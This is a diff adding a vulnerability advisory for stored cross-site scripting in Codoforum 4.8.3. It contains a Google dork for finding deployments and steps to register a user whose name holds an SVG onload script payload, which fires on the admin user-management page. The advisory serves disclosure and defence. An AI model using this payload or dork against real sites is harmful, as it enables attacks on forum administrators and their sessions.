@@ -1,0 +1,22 @@
+# Exploit Title: Codoforum 4.8.3 - Persistent Cross-Site Scripting
+# Google Dork: intext:"Powered by Codoforum"
+# Date: 2020-01-03
+# Exploit Author: Prasanth c41m, Vyshnav Vizz
+# Vendor Homepage: https://codoforum.com/index.php
+# Software Link: https://codoforum.com/buy
+# Version: Codoforum 4.8.3 
+# Tested on: [relevant os]
+# CVE : [if applicable]
+# source: https://medium.com/@c41m/b2e1133c6a91?
+
+Codoforum is prone to a stored xss vulnerability.
+An attacker can exploit this issue to creating user with payload and perform cross-site scripting attacks.
+Codoforum version 4.8.3 is vulnerable. 
+
+1. Install Codoforum 4.8.3 in a local server.
+2. Goto http://localhost/index.php?u=/user/register
+3. Create a user using :- 
+			username : "><svg/onload=alert(1)>
+			password : password
+			email    : c41m@email.com
+4. Now goto http://localhost/admin/index.php?page=users/manage, an XSS alert popup will be triggered here.
